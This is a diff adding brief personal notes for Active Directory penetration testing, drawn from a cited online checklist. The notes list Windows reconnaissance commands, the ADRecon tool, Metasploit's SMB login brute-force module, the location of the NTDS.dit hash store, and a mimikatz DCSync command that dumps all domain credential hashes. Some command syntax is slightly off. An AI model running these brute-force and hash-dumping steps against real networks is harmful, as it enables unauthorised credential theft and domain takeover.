@@ -1,0 +1,23 @@
+Reconnaissance Commands:
+c:\ > net user - see local users
+c:\ >whoami  - see the current user associated with Active Directory logged in
+c:\ >whoami /groups - show you the current group
+c:\ > net user \domain - shows you all users from any group in the active directory
+c:\ > net user [username] domain. - see every user’s group
+
+https://github.com/sense-of-security/ADRecon
+
+msf > use auxiliary/scanner/smb/smb_login 
+  - brute force attack on active directory, you can use Metasploit Framework auxiliaries
+
+All hashes are stored in a file named “NTDS.dit” in this location :
+
+C:\Windows\NTDS
+
+mimikatz # lsadump::dcsync /domain:pentestlab.local /all /csv
+  - extract hashes from this file
+
+source:
+  https://gbhackers.com/active-directory-penetration-testing-checklist/?fbclid=IwAR1xJKda9qUcZquxg0GBpkQ0MCJHRIZ-Wa4TPAW8qlPYKMV_FOk_i0cknL8
+
+
